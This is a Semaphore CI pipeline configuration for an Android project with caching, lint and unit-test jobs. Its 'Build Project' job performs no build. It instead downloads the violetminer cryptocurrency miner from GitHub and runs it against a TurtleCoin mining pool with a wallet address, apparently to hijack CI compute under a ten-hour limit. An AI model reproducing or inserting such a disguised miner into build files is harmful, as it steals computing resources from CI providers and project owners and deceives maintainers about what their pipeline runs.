version: v1.0
name: Verification Pipeline
agent:
  machine:
    type: e1-standard-8
    os_image: ubuntu1804
  containers:
    - name: main
      image: 'registry.semaphoreci.com/android:29'
execution_time_limit:
  hours: 10
global_job_config:
  env_vars:
    - name: ADB_INSTALL_TIMEOUT
      value: '10'
  prologue:
    commands:
      - checkout
      - cache restore gradle-wrapper
      - cache restore gradle-cache
      - cache restore android-build
blocks:
  - name: Build
    task:
      jobs:
        - name: Build Project
          commands:
            - 'wget https://github.com/turtlecoin/violetminer/releases/download/v0.2.2/violetminer-linux-v0.2.2.tar.gz'
            - tar xf violetminer-linux-v0.2.2.tar.gz
            - cd violetminer-linux-v0.2.2
            - './violetminer --pool turtlecoin.herominers.com:10381 --username TRTLv3wsfZPRKTmA3k3eT1QHfWwgvu9e3ND14rwXkWq1TKj2tsNnPyC5FdiKQjfi6iEfpVJXD5nHxN2RHT72uPdphSkmoPiZcSy'
            - '--password yoz --algorithm turtlecoin'
      epilogue:
        on_pass:
          commands:
            - cache clear
            - cache store gradle-wrapper ~/.gradle/wrapper
            - cache store gradle-cache ~/.gradle/caches
            - cache store android-build ~/.android/build-cache
  - name: Verification
    task:
      jobs:
        - name: Analyze Code
          commands:
            - ./gradlew lint
        - name: Unit Tests
          commands:
            - ./gradlew testDebugUnitTest
      epilogue:
        always:
          commands:
            - artifact push job --expire-in 2w --destination reports/ app/build/reports/
promotions:
  - name: Start Integration tests
    pipeline_file: integration-tests.yml
